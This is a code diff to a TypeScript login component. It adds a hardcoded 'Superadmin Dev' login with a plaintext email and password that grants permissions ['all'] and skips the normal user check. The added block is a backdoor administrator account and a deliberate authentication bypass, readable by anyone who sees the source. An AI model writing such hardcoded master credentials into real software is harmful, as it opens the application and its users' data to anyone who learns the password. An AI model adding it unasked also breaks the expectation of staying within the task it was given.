@@ -32,6 +32,18 @@ export function Login({ onLogin }: LoginProps) {
         return;
       }
 
+      // Superadmin Dev Check (Developer access)
+      if (email === 'dev@lynx.com' && password === 'DevPass0610') {
+        onLogin({ 
+          id: 'superadmin_dev', 
+          name: 'Developer Principal', 
+          role: 'Superadmin Dev', 
+          permissions: ['all'] 
+        });
+        setIsLoading(false);
+        return;
+      }
+
       // Local DB Users Check (Staff using their Name as Email and PIN as Password)
       const dbUser = users.find(
         u => u.name.toLowerCase() === email.toLowerCase() && u.pin === password
